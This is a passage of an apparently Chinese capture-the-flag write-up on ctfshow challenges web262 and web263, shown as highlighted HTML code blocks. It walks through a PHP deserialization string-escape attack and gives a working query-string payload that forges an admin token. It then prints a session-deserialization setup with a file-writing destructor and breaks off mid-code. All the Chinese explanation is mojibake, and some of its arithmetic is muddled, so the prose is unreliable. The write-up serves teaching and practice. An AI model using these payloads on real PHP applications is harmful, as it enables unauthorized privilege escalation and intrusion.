punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'fuck'</span><span class="token punctuation">,</span> <span class="token string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€message.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 15:13:03# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥çš„ç‚¹åœ¨cookieçš„msgç»„</p><p>æˆ‘ä»¬éœ€è¦çš„æ ·å­ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token operator">=</span><span class="token string">'3'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:5:"admin";}</span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:4:"user";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ï¼Œåœ¨constructä¸­æ˜¯æ²¡æœ‰tokençš„åˆå§‹åŒ–çš„ï¼Œè€Œåˆä¸å­˜åœ¨å¯¹è±¡æ³¨å…¥ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨å­—ç¬¦ä¸²çš„ç¼©çŸ­æ¥å®ç°æ›¿æ¢tokençš„å€¼ï¼Œå¯ä»¥çœ‹å‡ºæ¥ä¸ä¸Šé¢ç›¸æ¯”æ˜¯å°‘äº†ä¸€ä¸ªå­—ç¬¦çš„ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœæ˜¯ï¼š</p><pre class="line-numbers language-php"><code class="language-php">å°†s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>æ’å…¥åˆ°O<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"message"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"from"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"msg"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"to"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ä¸­<span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token operator">=</span><span class="token string">'3";s:5:"token";s:5:"admin";}'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å¤šäº†27ä¸ªå­—ç¬¦</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:28:"3";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}</span>è¿™æ ·å°±æ¬ºéª—çš„å¤©è¡£æ— ç¼äº†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡è¿™æ ·çš„æ–¹å¼æ¥å®ç°æ¬ºéª—ï¼Œä½†æ˜¯æ’å…¥çš„éƒ¨åˆ†</p><p>ä½†æ˜¯æ•´æ¡è¯­å¥æ˜¯å­˜åœ¨é€»è¾‘é—®é¢˜çš„ï¼š</p><p>åœ¨<code>s:28:&quot;3&quot;;</code>è¿™ä¸ªåœ°æ–¹ï¼Œæ­£å¸¸é€»è¾‘æ˜¯3åªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯å´è¢«æ ‡æ³¨ä¸º28ä¸ªï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°æŠ¥é”™ï¼Œä½†æ˜¯æ­¤é¢˜åœ¨ååºåˆ—åŒ–ä¹‹å‰ä¼šå¯¹msgçš„å‚æ•°è¿›è¡Œæ›¿æ¢æ“ä½œï¼Œä¼šå°†4ä¸ªå­—ç¬¦çš„fuckæ›¿æ¢5ä¸ªå…³å­—ç¬¦çš„loveuï¼Œè¿™æ ·çš„è¯æœ¬æ¥ç¼ºå°‘çš„27ä¸ªå­—ç¬¦ï¼Œå°±ä¼šè¢«ç»è¿‡å¢åŠ æ›¿æ¢è€Œå¤šå‡ºæ¥çš„27ä¸ªå­—ç¬¦é¡¶æ›¿ï¼Œæ­£å¥½æ»¡è¶³136=109(love)+27(u)ï¼Œè€Œåé¢çš„27ä¸ªå­—ç¬¦ä¹Ÿå°±é¡ºç†æˆç« çš„æ›¿æ¢äº†åé¢çš„token</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token operator">=</span><span class="token string">'3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ­¤å¤„æœ‰27ä¸ªfuck=109+27=136</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:136:"3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre><code>?f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}</code></pre><p>ç„¶åè®¿é—®message.phpå°±å¯ä»¥å¾—åˆ°flag</p><h1 id="web263â€”â€”sessionååºåˆ—åŒ–"><a href="#web263â€”â€”sessionååºåˆ—åŒ–" class="headerlink" title="web263â€”â€”sessionååºåˆ—åŒ–"></a>web263â€”â€”sessionååºåˆ—åŒ–</h1><p><a href="http://www.zipæ–‡ä»¶æ³„éœ²ï¼Œå…¶ä¸­çš„**inc.php**æ–‡ä»¶å­˜åœ¨file_put_contentså±é™©å‡½æ•°ï¼š" target="_blank" rel="noopener">www.zipæ–‡ä»¶æ³„éœ²ï¼Œå…¶ä¸­çš„**inc.php**æ–‡ä»¶å­˜åœ¨file_put_contentså±é™©å‡½æ•°ï¼š</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>CTFSHOW<span class="token punctuation">\</span>CTFSHOW</span><span class="token punctuation">;</span> <span class="token keyword">require_once</span> <span class="token string">'CTFSHOW.php'</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'database_type'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'mysql'</span><span class="token punctuation">,</span>    <span class="token string">'database_name'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'web'</span><span class="token punctuation">,</span>    <span class="token string">'server'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string">'username'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'root'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'root'</span><span class="token punctuation">,</span>    <span class="token string">'charset'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'utf8'</span><span class="token punctuation">,</span>    <span class="token string">'port'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3306</span><span class="token punctuation">,</span>    <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token string">'option'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>        <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_CASE</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CASE_NATURAL</span>    <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// sqlæ³¨å…¥æ£€æŸ¥</span><span class="token keyword">function</span> <span class="token function">checkForm</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\+|\=|\[|\]|\;|\:|\'|\"|\&lt;|\,|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"log-"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string">"ä½¿ç”¨"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">.</span><span class="token string">"ç™»é™†"</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">status</span><span class="token operator">?</span><span class="token string">"æˆåŠŸ"</span><span class="token punctuation">:</span><span class="token string">"å¤±è´¥"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"----"</span><span class="token punctuation">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$this-&gt;usernameï¼Œ$this-&gt;password</code>å‡ä¸ºæˆ‘ä»¬å¯æ§ï¼Œæ‰€ä»¥å­˜åœ¨æ¼æ´</p><p><a href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request%5Fid%22%3A%22160775411819724848183660%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160775411819724848183660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2118.3001.4450" target="_blank" rel="noopener">[ä»£ç å®¡è®¡]PHPä¸­sessionçš„å­˜å‚¨æ–¹å¼(WP)</a></p><p><strong>index.phpï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span>         <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¹Ÿå°±æ˜¯ä¸€å¼€å§‹çš„ç™»é™†é¡µé¢</p><p><strong>check.phpï¼š</strong>é’ˆå¯¹cookieä¸­çš„limitè¿›è¡Œæ¬¡æ•°æ£€æµ‹</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string">'inc/inc.php'</span><span class="token punctuation">;</span><span class="token variable">$GET</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"pass"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$GET</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>    <span class="token string">'id'</span><span class="token punctuation">,</span>        <span class="token string">'UserName0'</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>        <span class="token string">"AND"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span>        <span class="token string">"UserName0[=]"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"PassWord1[=]"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//å¯†ç å¿…é¡»ä¸º128ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span>        <span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"æ¬¢è¿æ‚¨"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'UserName0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span>        <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token 